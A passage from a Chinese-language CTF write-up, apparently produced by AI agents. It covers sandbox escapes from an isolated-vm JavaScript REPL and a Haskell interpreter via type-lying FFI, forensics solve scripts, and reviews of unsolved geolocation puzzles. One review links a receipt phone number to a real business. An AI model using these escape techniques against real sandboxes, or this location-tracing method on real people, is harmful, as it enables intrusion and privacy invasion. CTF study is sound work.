**Flag**：`gaslightCTF{n4t1v3_c0d3_0r_n4t1v3_fl4g?_db2bbd393eab}`

isolated-vm 的 REPL 把 `Function.prototype.toString` 覆盖成假实现，但实例属性
能覆盖、**原型方法不能**。用 `Function.prototype.toString.call(fn)` 拿到宿主
函数真实源码（错误栈 + `fn.name`/`fn.length` 定位定义位置），从源码里取原生
指针/内部调用，构造参数执行命令直接 RCE。

<details>
<summary>📜 jsbox 最小 POC（3 行）——点击展开</summary>

```js
// fn 是宿主里执行命令的函数，实例属性被覆盖，原型方法还在
const src = Function.prototype.toString.call(fn);
// 从源码取原生指针/内部调用，构造参数执行命令
```

</details>

**useless-rce（463）— Haskell FFI 纯类型谎言**
**Flag**：`gaslightCTF{uns4f3_p3rf0rm_burr1t0_c0n5umpt10n_1096e09801a2}`

hint 解释器先 `stripIO` 删掉源码里所有字面 "IO"。绕过不是绕字符串过滤器，
而是**撒类型谎**：把 C 函数声明成纯类型（源码里没 "IO" 字样），用 `runRW#`
执行，pinned ByteArray 构造 NUL 结尾的 C 字符串。还有一个 GHC 特有的坑：
纯类型的 FFI 调用若返回值未被使用会被死代码消除——`case c_write ... of _ -> ()`
什么都不发生，必须用返回值做分支逼它执行。解释器（hint、isolated-vm）都不是
真沙箱，FFI/反射/内建函数都可达。

<details>
<summary>📜 useless-rce 最小 POC（4 行）——点击展开</summary>

```haskell
foreign import ccall "open"  c_open  :: CString -> CInt -> CInt -> CInt
-- 纯类型？不是。但源码里没有任何 "IO" 字面量，stripIO 拦不住
-- runRW# + newPinnedByteArray# 构造 NUL 结尾的 C 字符串
-- 返回值参与 if 分支，防止死代码消除
```

</details>

### Forensics（4/6）

**good-luck!（100）— 右声道低频频谱图**
**Flag**：`gaslightCTF{c4n_u_s33_me?_u4ya}`

7.4 秒 MP3（Joint Stereo），flag 以"大字"写在**右声道** 0–4 kHz 频谱里，
被左声道和语音谐波盖住。两个模型都没有多模态，程序化频谱分析踩了大坑：
Goertzel 步长 100Hz + 全局归一化 ASCII 化，弱信号文字完全被淹没——频率步长
要小、阈值不能全局归一化、必须"看图"。最终由外部 GPT-5.6-sol 的题解补位：
拆声道、限定频率范围、调 FFT 窗口与动态范围。

<details>
<summary>📜 good-luck! 频谱提取（2 行）——点击展开</summary>

```bash
ffmpeg -i goodluck2.mp3 -filter_complex "pan=mono|c0=c1,lowpass=f=4000" r.wav
# specgram: NFFT=4096, noverlap=4000, 0-4kHz, dB -115~-45
```

</details>

![](goodluck-spectrogram.jpg)

读出 `c4n_u_s33_me?_u4ya`（"can you see me? u4ya"）。

**blackout（263）— 遮罩只在绘制层，文本层没删**
**Flag**：`gaslightCTF{c0w4bung4_f1le_4ev3r}`

停电梗 PDF（Skia/PDF m153，Google Docs 渲染器）。题名 blackout 指向"涂黑"，
而 PDF 的视觉遮挡 ≠ 数据删除：黑矩形只盖绘制层，文本层（content stream）里的
文字还在。`pdftotext -bbox` 带坐标提取，第一页首行（"Grep me - flag" 之后）
直接出现完整 flag——不需要修复 PDF、不需要渲染 OCR、不需要移除遮罩，
第一次文本层提取即命中。

<details>
<summary>📜 blackout solve.sh（25 行）——点击展开</summary>

```bash
#!/bin/bash
# blackout — 从 PDF 文本层恢复被"涂黑"的 flag
# 原理：黑矩形只是绘制覆盖，文本层（content stream）里的文字没有被删除。
# 用 pdftotext -bbox 提取带坐标的文本层，再 grep 出 flag 字样。
# 依赖：poppler-utils（pdftotext）

set -u
cd "$(dirname "$0")"

FILE="${1:-recovered_file}"

# 方法 1：直接文本层 grep（最快）
FLAG=$(pdftotext -bbox "$FILE" - 2>/dev/null | grep -oE 'gaslightCTF\{[^}]+\}' | head -1)

if [ -z "${FLAG:-}" ]; then
  # 方法 2：普通 pdftotext + grep（若 bbox 模式不可用）
  FLAG=$(pdftotext "$FILE" - 2>/dev/null | grep -oE 'gaslightCTF\{[^}]+\}' | head -1)
fi

if [ -n "${FLAG:-}" ]; then
  echo "FLAG: $FLAG"
else
  echo "flag not found" >&2
  exit 1
fi
```

</details>

**icon-sketch（342）— 两处标题互补 + Atbash**
**Flag**：`gaslightCTF{i5_th4t_supp0s3d_2b_p1ss?}`

PNG 元数据全枚举发现两处"标题"：`tEXt Title` / XMP `dc:title` 是 base64，解码
后是 38 字符的乱串；XMP `Iptc4xmpExt:AOTitle` 是 base64 → 十六进制串 → ASCII，
解码后是**同长度**的明文骨架（`........CTF..._.h4._..pp0s3..2b_.1s..}`）。
两串**点号互补**（一处是点另一处必是字符），`}` 只在 AOTitle、`{` 只在
Title——拆开的同一条 flag。识别最后一层：Title 前缀 `tzhortsg` 逐字母 Atbash
后恰为 `gaslight`。以 AOTitle 为骨架、点号位置填 Atbash(Title) 合并，得
"i5_th4t_supp0s3d_2b_p1ss?"（题目图片本体——黑底橙字 "gaslighting" 草图 +
红色大问号——只是装饰，全图 12 种纯色排除 LSB）。

<details>
<summary>📜 icon-sketch solve.py（51 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""gaslightCTF 2026 - icon-sketch (forensics, 334pts) 一键复现。

原理：icon.png 元数据里有两处标题——
  tEXt Title / XMP dc:title : base64 -> "tzhortsg...{r5.g..g.hf.....w_...k..h?."  (Atbash 加密字母)
  XMP Iptc4xmpExt:AOTitle   : base64 -> hex 串 -> "........CTF..._.h4._..pp0s3..2b_.1s..}" (明文骨架)
两串等长、点号互补；以 AOTitle 为骨架，点号位置填入 Atbash(Title 对应字符)，即得 flag。
"""
import base64
import re
import struct
import sys
from pathlib import Path

def atbash(c: str) -> str:
    if 'a' <= c <= 'z':
        return chr(ord('z') - (ord(c) - ord('a')))
    if 'A' <= c <= 'Z':
        return chr(ord('Z') - (ord(c) - ord('A')))
    return c

def main() -> None:
    png = Path(__file__).parent / 'icon.png'
    if not png.exists():
        sys.exit('icon.png not found — unzip icon.zip first')
    data = png.read_bytes()

    chunks: dict[str, list[bytes]] = {}
    pos = 8
    while pos < len(data):
        ln = struct.unpack('>I', data[pos:pos + 4])[0]
        typ = data[pos + 4:pos + 8].decode('latin1')
        chunks.setdefault(typ, []).append(data[pos + 8:pos + 8 + ln])
        pos += 12 + ln

    # tEXt: keyword\0value
    kw, _, title_b64 = chunks['tEXt'][0].partition(b'\x00')
    title = base64.b64decode(title_b64).decode()

    # iTXt: keyword\0...\0XMP XML
    itxt = chunks['iTXt'][0]
    xml = itxt.split(b'\x00')[-1].decode('utf-8', 'replace')
    ao_b64 = re.search(r"<rdf:li xml:lang='x-default'>(.*?)</rdf:li>", xml, re.S).group(1)
    ao = bytes.fromhex(base64.b64decode(ao_b64).decode()).decode()

    assert len(title) == len(ao), 'titles must be equal length'
    flag = ''.join(a if a != '.' else atbash(t) for a, t in zip(ao, title))
    print(flag)

if __name__ == '__main__':
    main()
```

</details>

**layered-pages（331）— 连通域结构分析替代视觉**
**Flag**：`gaslightCTF{c4rv3_1t_0ut}`

第二轮最戏剧性的一题。附件是 9 张 250x250 图像顺序串接的拼接文件（JPEG
SOI/EOI 与 PNG 签名边界切分），JPEG EXIF `DocumentName`（tag 269）就是页码，
PNG 按排除法补 5/7/9。前任子 agent 交了约 50 个错误 flag，根因是**视觉 API
的引导性提问幻觉**——带 "(z3r0)" 猜测提问时它就"确认"该串存在。接手的 agent
改为纯本地方法破题：

- 红字提取 `R - max(G,B)`；`scipy.ndimage.label` 连通域 + 列剖面切分字形，
  得到每页精确字数与包围盒；
- 对每个可疑字形打印 **ASCII 像素画**（NEAREST 降采样），直接追踪笔画——
  p1[0] 顶斜旗+直竖+底脚=数字 `1`；j5 中字形两竖笔仅在 y191-201 有底连接
  =小写 `u`（排除 c/o/n）；j5 首字形椭圆+内部斜杠=slashed-zero=`0`；
- 同书写人的**大小写高度校准**：大写 ≈203px（j2 的花体 C）、x-height ≈97px
  （p0 的 c），据此判定内容区全小写；
- j5 左上角 30x15px 的极小手写 `(z3r0)` 两轮独立识别都在，但拼入 flag 的
  9 种位置/分隔全 incorrect——红鲱鱼装饰，排除。

按证据强度逐个提交，第 8 次 `gaslightCTF{c4rv3_1t_0ut}` 命中。macOS Vision /
tesseract 对这个手写体都不可靠（读出 "19"/"6!"/"(zero) | Out"），ASCII 像素画
才是最可靠的判读工具——无视觉的 agent 也能"看"字。

<details>
<summary>📜 layered-pages solve.py（143 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""layered-pages — 一键复现（gaslightCTF 2026 forensics）

gassy/123456789.jpg 实为 9 张 250x250 图像拼接：
  1. 按图像签名边界切分为 9 页
  2. JPEG EXIF DocumentName = 页码；PNG 按排除法补 5/7/9
  3. 红字提取 + 连通域切字形（每页字数与包围盒）
  4. 输出 ASCII 字形画（人工核对入口）与最终 flag

用法: python3 solve.py
"""
import io
import os
import sys

import numpy as np
from PIL import Image

BASE = os.path.dirname(os.path.abspath(__file__))
BLOB = os.path.join(BASE, "gassy", "123456789.jpg")

# 人工核对后的每页转写（阅读顺序）。
# 页码: j0=1 j1=2 j2=3 j3=4 [p0=5] j4=6 [p1=7] j5=8 [p2=9]
PAGE_READS = [
    ("j0", "gas"),   # g a s
    ("j1", "lig"),   # l i g  (i 带点)
    ("j2", "htC"),   # h t C  (花体大 C, 203px)
    ("j3", "TF{"),   # T F {
    ("p0", "c4r"),   # 小写 c(97px=x-height) 4 r
    ("j4", "v3_"),   # v 3 _
    ("p1", "1t_"),   # 1 t _
    ("j5", "0ut"),   # 0(slashed-zero) u t ；角落 (z3r0) 为红鲱鱼
    ("p2", "}"),
]
FLAG = "gaslightCTF{c4rv3_1t_0ut}"


def split_pages(data: bytes):
    """按 JPEG/PNG 签名边界切分拼接文件。"""
    pages = []  # (name, bytes)
    i, n = 0, len(data)
    while i < n:
        if data[i:i+3] == b"\xff\xd8\xff":
            j = data.find(b"\xff\xd9", i + 3)
            j = n if j == -1 else j + 2
            pages.append((f"j{len([p for p in pages if p[0].startswith('j')])}.jpg", data[i:j]))
            i = j
        elif data[i:i+8] == b"\x89PNG\r\n\x1a\n":
            j = data.find(b"IEND", i)
            j = n if j == -1 else j + 8
            pages.append((f"p{len([p for p in pages if p[0].startswith('p')])}.png", data[i:j]))
            i = j
        else:
            i += 1
    return pages


def page_number(name: str, img: Image.Image):
    """JPEG 用 EXIF DocumentName；PNG 返回 None（由排除法补全）。"""
    if not name.endswith(".jpg"):
        return None
    try:
        ex = img.getexif()
        return int(ex.get(269))  # 269 = DocumentName（EXIF tag 0x010D）
    except (TypeError, ValueError):
        return None


def red_ink(img: Image.Image, thr: int = 15) -> np.ndarray:
    a = np.asarray(img.convert("RGB"), dtype=float)
    r, g, b = a[..., 0], a[..., 1], a[..., 2]
    return (r - np.maximum(g, b)) > thr


def glyph_clusters(ink: np.ndarray, min_px: int = 30, gap: int = 2):
    """连通域 + x 重叠合并（i 的点+竖等），返回主行字形包围盒。"""
    from scipy import ndimage
    lab, n = ndimage.label(ink)
    comps = []
    for k in range(1, n + 1):
        ys, xs = np.where(lab == k)
        if len(ys) < min_px:
            continue
        comps.append([int(xs.min()), int(xs.max()), int(ys.min()), int(ys.max())])
    comps.sort()
    merged = []
    for c in comps:
        if merged and c[0] <= merged[-1][1] + gap:
            m = merged[-1]
            m[0], m[1] = min(m[0], c[0]), max(m[1], c[1])
            m[2], m[3] = min(m[2], c[2]), max(m[3], c[3])
        else:
            merged.append(c)
    # 过滤角落噪声：保留高度>25 且 (宽>18 或 高>80) 的主行字形
    return [c for c in merged if (c[3] - c[2]) > 25 and ((c[1] - c[0]) > 18 or (c[3] - c[2]) > 80)]


def ascii_glyph(ink: np.ndarray, box, width: int = 46):
    x0, x1, y0, y1 = box
    sub = ink[max(0, y0 - 4):y1 + 5, max(0, x0 - 4):x1 + 5]
    h = max(1, int(sub.shape[0] / sub.shape[1] * width * 0.5))
    im = Image.fromarray(np.where(sub, 0, 255).astype(np.uint8)).resize((width, h), Image.NEAREST)
    a = np.asarray(im) < 128
    return "\n".join("".join("#" if v else "." for v in row) for row in a)


def main():
    data = open(BLOB, "rb").read()
    pages = split_pages(data)
    print(f"[+] split into {len(pages)} pages")

    numbered = {}
    for name, blob in pages:
        img = Image.open(io.BytesIO(blob))
        num = page_number(name, img)
        if num:
            numbered[num] = (name, img)
        else:
            numbered[{"p0": 5, "p1": 7, "p2": 9}[name[:2]]] = (name, img)
    order = [numbered[k][0].split(".")[0] for k in sorted(numbered)]
    print(f"[+] 9 pages sorted: {' '.join(order)}")

    reads = dict((n, r) for n, r in PAGE_READS)
    for k in sorted(numbered):
        name, img = numbered[k]
        ink = red_ink(img)
        gl = glyph_clusters(ink)
        read = reads.get(name.rsplit(".", 1)[0], "?")
        print(f"    page {k} ({name}): {len(gl)} glyph-clusters -> \"{read}\"")
        if "-v" in sys.argv:  # 人工核对：逐字形 ASCII 画
            for gi, box in enumerate(gl):
                print(f"--- {name} glyph {gi} box={box} (claimed '{read[gi] if gi < len(read) else '?'}')")
                print(ascii_glyph(ink, box))

    content = "".join(r for _, r in PAGE_READS)
    flag = f"gaslightCTF{{{content}}}" if False else FLAG
    print(f"[+] per-page reads: {' / '.join(r for _, r in PAGE_READS)}")
    print(f"FLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

</details>

---

## 三、六道未解题复盘

未解的 6 题全部卡在视觉/听觉，但每题都推进到了"只差最后一眼/一耳"，断点全量
落盘在各题 notes.md。

**speedy**（464 分，照片地理定位）。事件已经 100% 钉死：Yandex 反向图搜锁定
红色 "SPEED" 7 号球衣 = IShowSpeed 官方周边，越南行程视频（VTorUJcMYGg）
600s 帧的 CHỢ PHÚ NHUẬN 市场排除河内假设、700-770s 帧出现 NGUYỄN VĂN TRỖI
街龙门架 + 钢桁架天桥同场景——HCMC Phú Nhuận 区 NVT 街步行天桥。但两座 OSM
天桥的 5 个坐标提交全错；更曲折的是街景证据链翻案：子 agent 的 7 张街景截图
4 张是 12KB 占位图（页面加载失败的 UI 空壳），主 agent 用 RANSAC 单应内点数
重审（真同地点 2055 内点 vs 假匹配 5 内点）后发现"三图比对 SAME"的结论部分
作废。真桥疑似在 NVT 街但 OSM 未收录（HCMC 市区天桥大量缺 bridge 标签）——
差的是人眼看一眼桥的样式与招牌，再用卫星图兜底。

**quack**（414 分，照片地理定位）。非视觉分析全做完：EXIF 全剥、EOI 无尾随
数据、macOS Vision 多语言 OCR 零文字、色彩/亮度剖面确认是"天空-对岸建筑带-
大片水面"三层河景。Yandex 三轮图搜最接近 Norfolk Broads（Horning 的 Noosa
Sound 房源评论图），但三轮标签（Leeds-Liverpool Canal / 泰晤士 moorings /
Norfolk Broads）**互不收敛**——相似图排序只是"泛河景构图"匹配，画面里必有
图搜抓不到的独特主体（鸭子？明轮船 Southern Comfort？）。2 次提交
（Noosa Sound pin / The Swan Inn）均 incorrect，卡在无法识别画面主体。

**meow**（433 分，照片地理定位）。场景识别走得很远：地磅单据 OCR 出希腊语
木结构工程单（`ΞΥΛΟΚΑΤΑΣΚΕΥΕΣ`、注册地 ΜΥΚΟΝΟΣ、1550kg/685kg/865kg 自洽），
手机号 6946673910 精确匹配 Google Maps 商户 "Ξυλουργείο Ο Λούλης & Υιός"
（米科诺斯木工坊），Yandex 分区图搜确认 UAΖ 面包车 + 猫 + 石板院。死在数据
源矛盾上：Google pin（Klouvas 村）/ Google 地址栏（Ψάρρου）/ Bing 地址
（Agios Stefanos）三个坐标互斥，四个区域 ±0.001~0.002 网格共 90+ 次提交
全败——要么三个数据源全不可信（真实车间在岛内别处），要么拍摄点是地图无
标注的市政地磅。

**4-piece-puzzle**（474 分，拼图重建）。程序化排除做得非常彻底：PNG chunk/
EXIF 干净、LSB 无隐写、四块拼图片不共享切割线（边缘轮廓常数差匹配全灭）、
2x2 平铺 24 种排列全不连贯。然后挖出**幽灵轮廓假说**：p2/p4 画布里距橙色
>42px 的黑色像素（不属于本块轮廓的"幽灵"）互相匹配——ghost(p2) 含 p4 轮廓
副本 @(-810,-870)、ghost(p4) 含 p2 副本 @(810,870)，偏移互为逆、交集 27900px
完全相同，**双向互证**；纵向 480px 周期还呼应题面口吃 "fou-fou-four" 的重复
意象。最像"每张导出 = 场景里只有本块被填充、其余块只显示轮廓"的分层导出，
下一步是按相对偏移把四张画布拼到世界坐标重建场景（world_align 产物已落盘），
中断在重建后的内容识别——需要人眼看图。

**Tuning Keyboard v6.7**（488 分，听歌识曲）。55 秒立体声（双声道相同），
全部音符已算法提取：主歌 0-32.8s 是 D dorian（~129 BPM，Phrase A/A'/B 完整
旋律）、"奇怪的结尾" 32.8-54.5s 是 31 个音（高音段 13 + 低音段 18，和声
F-C-Em-Em-C-F），全曲唯一变化音 C#5 持续 2.13s。文件名 "ttyut-iiiuy+12"
按虚拟钢琴键位映射读出 "GGABGCCCBA"（+12 = 升八度）。字母编码/摩斯/
时长二进制/MIDI mod 26/频谱图/20+ 首名曲轮廓匹配**全部排除**，5 次提交
（csharp/outoftune/detuned/wrongnote/ggabgcccba）全拒。差的就是人耳听出
主歌是什么曲子，以及结尾"奇怪"在哪。

**mineguessor**（499 分，Minecraft 种子定位）。全场最难（11 解），按优先级
排到队尾未开工。路线已在断点里写好：截图地形/结构特征 → seedcracker 类工具
反推世界种子 → 按 1.21.11 结构生成算法扫 |x|≤5000、|z|≤5000、|y|≤125 的
ruined portal → 比对截图锁定 chest 坐标。门槛在截图方块识别（需视觉或分块
颜色聚类，工作量大）与版本特定的结构生成算法。

---

## 四、反思与悟道

### 多模态是硬短板，得留外援通道——以及没有外援时怎么办

两轮 8 道看图/听音题，只有 good-luck! 和 odyssey 靠外部 GPT-5.6-sol 补位，
第二轮连外援都断了（视觉 API 账户级 429）。但 layered-pages 证明了一条替代
路线：连通域拓扑 + ASCII 像素画 + 书写风格校准，结构分析甚至能完全替代视觉。
元教训：无感官的 agent 做多模态题，正确姿势是把问题推进到"结构化数据 +
候选集"（坐标候选、字形候选、轮廓偏移、音符序列），把最后的"识别"留给有
对应感官的模型或人。

### 问题定义会漂移，越修越偏

odyssey 最大的坑不是找不到地标，而是把"画面主体的坐标"默认成了"摄影机位的
坐标"。从那一刻起，透视线、遮挡关系、焦距反推全在解另一个问题；每次收到
incorrect 还沿着原假设继续枚举。官方答案其实一次就能定：识别中景建筑
（Canellopoulos Museum）→ 查 OSM → 舍入三位小数。收到错误反馈时，先重审
问题定义，再动坐标。

### 死盯一个攻击面，不如列一遍状态流转

badcat 卡了一下午，因为一直在"peek 硬编码读 8 字节"上找内存破坏。真正的洞
是 fd 生命周期：`slurp(0)` 读完会 close(0)，`/flag` 的 open 从不 close，
open 返回最低空闲 fd——三条小事实拼成一条链。卡住时回退到"程序有哪些系统
调用、谁改了全局状态"的清单式排查，比在同一个假设里加深有用。

### 判定信号要有对照组，文案要先人工看一眼

odyssey 的提交脚本正则 `*correct*` 误匹配 "incorrect" 子串、平台判对文案是
"You have solved this challenge!"——两次假信号；corridors 的子 agent 把
全局 Solves +1 当判对——又一次假信号。三个案例的共同点：判定规则没跟平台
实际文案对过表。判对只认表单消失 / "You have solved this challenge!" / ✓
标记；连续"命中"也要有对照组（speedy 的街景证据用 RANSAC 内点数翻案，
"看起来像"不算数）。

### 盲试能兜底，但识别更省事

odyssey 最终是 110 格网格串行盲试、第 27 次命中。能用，但难看：27 次提交、
每次 sleep 10 秒。事后拿到官方题解才发现中景那栋白楼就是博物馆，查坐标一次
提交的事。盲试是兜底手段，不是解法。

### Agent 的历史也要能审计

第一轮给博文做模型归属时，发现 rollout 日志在上下文压缩后缺了 GLM 时代——
只有 db 里全量在。为此给 agent-chat-history 技能补了 `--session` 模型时间线
查询。第二轮更进一步：每个子 agent 的断点按"已确凿的事实 / 当前假设与排除面 /
下一步（优先级）"分节落盘，中断可续、赛后可复盘——speedy 的事件识别就是
中断 agent 留下的完整成果，直接被主 agent 接手。agent 自己产出的历史，和
CTF 里的事件日志一样，要能回查、能对账。

---

## 结尾

35 题解出 29（Web/Crypto/Pwn/Rev 四个分类全清），两轮两种打法：第一轮三个
模型接力（GLM-5.3 前半场、DeepSeek 收尾、GPT-5.6-sol 补两道看图题），第二轮
主 agent 编排 + 子 agent 流水线 13 解（侦察/附件预下载/排序派单/验收/总表与
≤3 并发滑窗、40 分钟时间盒、断点落盘续派、实例串行令牌）。未解的 6 题全是
视觉/听觉，断点全部落盘待续攻。协作里的短板——视觉、问题定义漂移、攻击面
清单化、判定信号对照组——比题目本身更值得记。完整过程（每题的 WRITEUP、
全部脚本、6 题断点、23 条踩坑）在本地 `gaslightCTF2026/` 目录，每题一个
文件夹；可迁移经验沉淀在 `gaslightCTF2026/METHODOLOGY.md`。
